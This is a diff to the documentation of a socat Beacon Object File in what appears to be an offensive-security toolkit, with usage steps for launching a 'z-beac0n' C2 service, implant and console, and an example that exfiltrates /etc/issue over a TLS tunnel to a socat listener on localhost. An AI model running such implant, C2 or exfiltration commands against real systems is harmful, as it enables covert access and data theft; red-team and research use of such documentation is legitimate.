@@ -36,6 +36,7 @@ BOF source code: [socat code](../src/socat.zig)
 ## Use cases
 
 ### Downloading large file over TCP connection
+**Objective:** Downloading the file from within [z-beac0n implant](../../examples/implant/).
 
 Preparing and serving file:
 
@@ -51,19 +52,17 @@ Ncat: Listening on [::]:2222
 Ncat: Listening on 0.0.0.0:2222
 ```
 
-Downloading the file:
-```
 Launching `z-beac0n C2 service` on `terminal 2`:
-
+```
     $ cd examples/implant/
     $ python z-beac0n-C2.py
+```
 
 Launching `z-beac0n implant` on `terminal 3`:
 
     $ ./zig-out/bin/z-beac0n_lin_x64.elf
-```
 
-Running `z-beac0n console` and executing `socat` BOF on `terminal 4`:
+Running `z-beac0n console` to download the file using `socat` BOF on `terminal 4`:
 
 ```
 $ python z-beac0n-console.py
@@ -98,12 +97,13 @@ OUTPUT:
 ```
 
 ### Exfiltration of file content over TLS channel
+**Objective:** Downloading the file using ([CLI `bof` utility](../../examples/cli4bofs/)) via TLS channel.
 
 Running socat (original) as listener at `terminal 1`:
 
     terminal_1$ socat OPENSSL-LISTEN:2222,reuseaddr,cert=cert.pem,key=key.pem,verify=0 -
 
-Running `socat` bof using our CLI `bof` [utility](../../examples/cli4bofs/) for sending content of the `/etc/issue` file over TLS tunnel with `cacert.pem` certificate:
+Running `socat` bof using our CLI `bof` utility for sending content of the `/etc/issue` file over TLS tunnel with `cacert.pem` certificate:
 
     terminal_2$ bof -c BOF-Z-Labs.yaml exec socat.elf.x64.o OPEN:/etc/issue TLS:localhost:2222:cacert file:cacert.pem
 
@@ -114,7 +114,7 @@ Debian GNU/Linux 13 \n \l
 ```
 
 ### Fetching file content over TLS connection
-This time file with be downloaded from within [z-beac0n implant](../../examples/implant/).
+**Objective:** Downloading the file from within [z-beac0n implant](../../examples/implant/) via TLS channel.
 
 Serving content of the example file on `terminal 1`:
 
